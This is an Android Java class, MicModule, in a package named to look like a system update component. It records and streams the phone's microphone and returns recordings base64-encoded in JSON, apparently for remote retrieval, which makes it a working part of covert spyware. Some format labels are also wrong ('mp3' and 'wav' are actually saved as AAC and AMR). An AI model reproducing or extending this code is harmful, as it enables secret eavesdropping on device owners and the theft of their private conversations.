package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.AudioTrack;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.ActivityCompat;

import org.json.JSONObject;
import org.json.JSONException;
import org.json.JSONArray;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class MicModule {
    private static final String TAG = "MicModule";
    private Context context;
    private MediaRecorder mediaRecorder;
    private AudioRecord audioRecord;
    private AudioTrack audioTrack;
    private MediaPlayer mediaPlayer; // For MP3 playback
    private String currentRecordingPath;
    private boolean isRecording = false;
    private boolean isStreaming = false;
    private boolean isPlaying = false;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private AtomicBoolean shouldStream = new AtomicBoolean(false);
    private List<RecordingFile> recordings = new ArrayList<>();
    
    // Audio settings
    private int sampleRate = 44100;
    private int bitRate = 128;
    private String format = "mp3";
    private int channelConfig = AudioFormat.CHANNEL_IN_MONO;
    private int audioSource = MediaRecorder.AudioSource.MIC;
    
    // Callback for streaming data
    private StreamDataCallback streamCallback;
    
    public interface StreamDataCallback {
        void onStreamData(byte[] data, int length);
        void onStreamError(String error);
    }
    
    public MicModule(Context context) {
        this.context = context;
        startBackgroundThread();
        loadRecordings();
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("MicBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void loadRecordings() {
        try {
            File recordingsDir = new File(context.getExternalFilesDir(null), "recordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
                return;
            }
            
            File[] files = recordingsDir.listFiles((dir, name) -> 
                name.endsWith(".mp3") || name.endsWith(".3gp") || name.endsWith(".wav") || name.endsWith(".aac"));
            
            if (files != null) {
                for (File file : files) {
                    recordings.add(new RecordingFile(
                        file.getName(),
                        file.getAbsolutePath(),
                        file.length(),
                        file.lastModified()
                    ));
                }
                // Sort by date, newest first
                Collections.sort(recordings, (a, b) -> 
                    Long.compare(b.timestamp, a.timestamp));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error loading recordings", e);
        }
    }
    
    public String startRecording(int durationSeconds, String format, int bitRate) {
        Log.d(TAG, "🎤 startRecording() called");
        
        if (!checkPermission()) {
            return "ERROR: No microphone permission";
        }
        
        try {
            // Create recordings directory
            File recordingsDir = new File(context.getExternalFilesDir(null), "recordings");
            if (!recordingsDir.exists()) {
                recordingsDir.mkdirs();
            }
            
            // Generate filename
            String timestamp = String.valueOf(System.currentTimeMillis());
            String extension = format.equals("mp3") ? ".mp3" : 
                             (format.equals("wav") ? ".wav" : ".3gp");
            String fileName = "recording_" + timestamp + extension;
            currentRecordingPath = new File(recordingsDir, fileName).getAbsolutePath();
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(audioSource);
            mediaRecorder.setOutputFormat(getOutputFormat(format));
            mediaRecorder.setAudioEncoder(getAudioEncoder(format));
            mediaRecorder.setAudioEncodingBitRate(bitRate * 1000);
            mediaRecorder.setAudioSamplingRate(sampleRate);
            mediaRecorder.setOutputFile(currentRecordingPath);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            Log.d(TAG, "✅ Recording started: " + currentRecordingPath);
            
            // If duration is specified, stop after that time
            if (durationSeconds > 0) {
                backgroundHandler.postDelayed(() -> {
                    if (isRecording) {
                        String result = stopRecording();
                        Log.d(TAG, "⏱️ Auto-stopped recording: " + result);
                    }
                }, durationSeconds * 1000L);
            }
            
            return "SUCCESS: Recording started";
            
        } catch (IOException | IllegalStateException e) {
            Log.e(TAG, "❌ Error starting recording", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String stopRecording() {
        Log.d(TAG, "🎤 stopRecording() called");
        
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                
                File audioFile = new File(currentRecordingPath);
                if (audioFile.exists()) {
                    RecordingFile recording = new RecordingFile(
                        audioFile.getName(),
                        audioFile.getAbsolutePath(),
                        audioFile.length(),
                        audioFile.lastModified()
                    );
                    recordings.add(0, recording);
                    
                    FileInputStream fis = new FileInputStream(audioFile);
                    byte[] bytes = new byte[(int) audioFile.length()];
                    fis.read(bytes);
                    fis.close();
                    
                    String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                    Log.d(TAG, "✅ Recording stopped, size: " + bytes.length + " bytes");
                    
                    // Return JSON with file info
                    JSONObject result = new JSONObject();
                    try {
                        result.put("status", "success");
                        result.put("file_name", audioFile.getName());
                        result.put("file_path", audioFile.getAbsolutePath());
                        result.put("file_size", audioFile.length());
                        result.put("file_data", base64);
                        result.put("duration", getAudioDuration(audioFile));
                    } catch (JSONException e) {
                        Log.e(TAG, "JSON error", e);
                    }
                    return result.toString();
                }
            } catch (IOException e) {
                Log.e(TAG, "❌ Error stopping recording", e);
                return "ERROR: " + e.getMessage();
            }
        }
        return "ERROR: No active recording";
    }
    
    public String listRecordingsDetailed() {
        try {
            File recordingsDir = new File(context.getExternalFilesDir(null), "recordings");
            JSONObject result = new JSONObject();
            JSONArray recordingsArray = new JSONArray();
            
            if (!recordingsDir.exists()) {
                result.put("status", "error");
                result.put("message", "Recordings directory does not exist");
                return result.toString();
            }
            
            File[] files = recordingsDir.listFiles((dir, name) -> 
                name.endsWith(".mp3") || name.endsWith(".3gp") || name.endsWith(".wav") || name.endsWith(".aac"));
            
            if (files == null || files.length == 0) {
                result.put("status", "success");
                result.put("message", "No recordings found");
                result.put("recordings", recordingsArray);
                result.put("directory", recordingsDir.getAbsolutePath());
                return result.toString();
            }
            
            for (File file : files) {
                JSONObject recording = new JSONObject();
                recording.put("name", file.getName());
                recording.put("path", file.getAbsolutePath());
                recording.put("size", file.length());
                recording.put("last_modified", file.lastModified());
                recording.put("readable", file.canRead());
                recordingsArray.put(recording);
                Log.d(TAG, "Found recording: " + file.getName() + " - " + file.length() + " bytes");
            }
            
            result.put("status", "success");
            result.put("recordings", recordingsArray);
            result.put("count", files.length);
            result.put("directory", recordingsDir.getAbsolutePath());
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error listing recordings", e);
            try {
                JSONObject error = new JSONObject();
                error.put("status", "error");
                error.put("message", e.getMessage());
                return error.toString();
            } catch (JSONException je) {
                return "ERROR: " + e.getMessage();
            }
        }
    }
    
    public String startStreaming(int sampleRate, int bitRate, String format, StreamDataCallback callback) {
        Log.d(TAG, "🎤 startStreaming() called");
        
        if (!checkPermission()) {
            return "ERROR: No microphone permission";
        }
        
        this.streamCallback = callback;
        this.sampleRate = sampleRate;
        this.bitRate = bitRate;
        this.format = format;
        
        try {
            int bufferSize = AudioRecord.getMinBufferSize(
                sampleRate,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            );
            
            // Ensure minimum buffer size
            bufferSize = Math.max(bufferSize, 4096);
            
            audioRecord = new AudioRecord(
                audioSource,
                sampleRate,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            );
            
            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                return "ERROR: AudioRecord initialization failed";
            }
            
            shouldStream.set(true);
            audioRecord.startRecording();
            isStreaming = true;
            
            // Make a final copy of bufferSize for the lambda
            final int finalBufferSize = bufferSize;
            backgroundHandler.post(() -> streamAudioData(finalBufferSize));
            
            Log.d(TAG, "✅ Streaming started");
            return "SUCCESS: Streaming started";
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Security error", e);
            return "ERROR: " + e.getMessage();
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting stream", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String getRecordingsPath() {
        try {
            File recordingsDir = new File(context.getExternalFilesDir(null), "recordings");
            return "SUCCESS: Recordings saved to: " + recordingsDir.getAbsolutePath();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    private void streamAudioData(int bufferSize) {
        byte[] buffer = new byte[bufferSize];
        int bytesRead;
        int silentChunks = 0;
        
        while (shouldStream.get() && audioRecord != null) {
            try {
                bytesRead = audioRecord.read(buffer, 0, buffer.length);
                
                if (bytesRead > 0) {
                    // Check if audio is silent (first few chunks might be silent)
                    boolean isSilent = true;
                    for (int i = 0; i < Math.min(100, bytesRead); i++) {
                        if (buffer[i] != 0) {
                            isSilent = false;
                            break;
                        }
                    }
                    
                    if (!isSilent && streamCallback != null) {
                        // Copy only the actual data read
                        byte[] data = new byte[bytesRead];
                        System.arraycopy(buffer, 0, data, 0, bytesRead);
                        streamCallback.onStreamData(data, bytesRead);
                        silentChunks = 0;
                    } else {
                        silentChunks++;
                        // If too many silent chunks, might be a problem
                        if (silentChunks > 50) {
                            Log.w(TAG, "Too many silent chunks, possible mic issue");
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error in stream", e);
                if (streamCallback != null) {
                    streamCallback.onStreamError(e.getMessage());
                }
                break;
            }
        }
    }
    
    public String stopStreaming() {
        Log.d(TAG, "🎤 stopStreaming() called");
        
        shouldStream.set(false);
        isStreaming = false;
        
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping audio record", e);
            }
            audioRecord = null;
        }
        
        Log.d(TAG, "✅ Streaming stopped");
        return "SUCCESS: Streaming stopped";
    }
    
    // FIXED: Using MediaPlayer for proper MP3 playback
    public String playRecording(String filePath) {
        Log.d(TAG, "🎤 playRecording() called: " + filePath);
        
        File audioFile = new File(filePath);
        if (!audioFile.exists()) {
            return "ERROR: File not found";
        }
        
        try {
            // Stop any currently playing media
            if (mediaPlayer != null) {
                mediaPlayer.release();
                mediaPlayer = null;
            }
            
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(filePath);
            mediaPlayer.prepare();
            mediaPlayer.start();
            isPlaying = true;
            
            mediaPlayer.setOnCompletionListener(mp -> {
                Log.d(TAG, "✅ Playback completed");
                mp.release();
                mediaPlayer = null;
                isPlaying = false;
            });
            
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                Log.e(TAG, "❌ MediaPlayer error: " + what + ", " + extra);
                mp.release();
                mediaPlayer = null;
                isPlaying = false;
                return true;
            });
            
            return "SUCCESS: Playback started";
            
        } catch (IOException e) {
            Log.e(TAG, "❌ Error playing recording", e);
            return "ERROR: " + e.getMessage();
        } catch (IllegalStateException e) {
            Log.e(TAG, "❌ Illegal state error", e);
            return "ERROR: " + e.getMessage();
        } catch (Exception e) {
            Log.e(TAG, "❌ Unexpected error", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String stopPlayback() {
        Log.d(TAG, "🎤 stopPlayback() called");
        
        isPlaying = false;
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (IllegalStateException e) {
                Log.e(TAG, "Error stopping media player", e);
            }
            mediaPlayer = null;
        }
        
        if (audioTrack != null) {
            try {
                audioTrack.stop();
                audioTrack.release();
            } catch (IllegalStateException e) {
                Log.e(TAG, "Error stopping audio track", e);
            }
            audioTrack = null;
        }
        
        return "SUCCESS: Playback stopped";
    }
    
    public String getRecordings() {
        try {
            JSONObject result = new JSONObject();
            JSONArray recordingsList = new JSONArray();
            
            for (RecordingFile recording : recordings) {
                JSONObject rec = new JSONObject();
                rec.put("name", recording.name);
                rec.put("path", recording.path);
                rec.put("size", recording.size);
                rec.put("timestamp", recording.timestamp);
                rec.put("duration", getAudioDuration(new File(recording.path)));
                recordingsList.put(rec);
            }
            
            result.put("status", "success");
            result.put("recordings", recordingsList);
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String deleteRecording(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                return "ERROR: File not found";
            }
            
            if (file.delete()) {
                // Remove from list
                recordings.removeIf(r -> r.path.equals(filePath));
                
                JSONObject result = new JSONObject();
                result.put("status", "success");
                result.put("message", "File deleted");
                return result.toString();
            } else {
                return "ERROR: Could not delete file";
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error deleting file", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String downloadRecording(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                return "ERROR: File not found";
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();
            
            String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
            
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("file_name", file.getName());
            result.put("file_data", base64);
            result.put("file_size", file.length());
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error downloading file", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String configureSettings(int sampleRate, int bitRate, String format, String channel) {
        this.sampleRate = sampleRate;
        this.bitRate = bitRate;
        this.format = format;
        this.channelConfig = channel.equals("stereo") ? 
            AudioFormat.CHANNEL_IN_STEREO : AudioFormat.CHANNEL_IN_MONO;
        
        try {
            JSONObject result = new JSONObject();
            result.put("status", "success");
            result.put("sample_rate", sampleRate);
            result.put("bit_rate", bitRate);
            result.put("format", format);
            result.put("channel", channel);
            return result.toString();
        } catch (JSONException e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    private int getOutputFormat(String format) {
        switch (format.toLowerCase()) {
            case "mp3":
                return MediaRecorder.OutputFormat.MPEG_4;
            case "aac":
                return MediaRecorder.OutputFormat.MPEG_4;
            case "amr":
                return MediaRecorder.OutputFormat.AMR_NB;
            case "wav":
                return MediaRecorder.OutputFormat.THREE_GPP;
            default:
                return MediaRecorder.OutputFormat.MPEG_4;
        }
    }
    
    private int getAudioEncoder(String format) {
        switch (format.toLowerCase()) {
            case "mp3":
                return MediaRecorder.AudioEncoder.AAC;
            case "aac":
                return MediaRecorder.AudioEncoder.AAC;
            case "amr":
                return MediaRecorder.AudioEncoder.AMR_NB;
            case "wav":
                return MediaRecorder.AudioEncoder.AMR_NB;
            default:
                return MediaRecorder.AudioEncoder.AAC;
        }
    }
    
    private int getAudioDuration(File audioFile) {
        // Simple duration estimation for MP3/AAC based on file size and bitrate
        // In a real app, you'd use MediaPlayer or MediaMetadataRetriever
        return (int) (audioFile.length() * 8 / (bitRate * 1000));
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        shouldStream.set(false);
        isRecording = false;
        isStreaming = false;
        isPlaying = false;
        
        if (mediaRecorder != null) {
            try {
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing media recorder", e);
            }
            mediaRecorder = null;
        }
        
        if (audioRecord != null) {
            try {
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing audio record", e);
            }
            audioRecord = null;
        }
        
        if (audioTrack != null) {
            try {
                audioTrack.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing audio track", e);
            }
            audioTrack = null;
        }
        
        if (mediaPlayer != null) {
            try {
                mediaPlayer.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing media player", e);
            }
            mediaPlayer = null;
        }
        
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
    }
    
    // Inner class for recording metadata
    private static class RecordingFile {
        String name;
        String path;
        long size;
        long timestamp;
        
        RecordingFile(String name, String path, long size, long timestamp) {
            this.name = name;
            this.path = path;
            this.size = size;
            this.timestamp = timestamp;
        }
    }
}
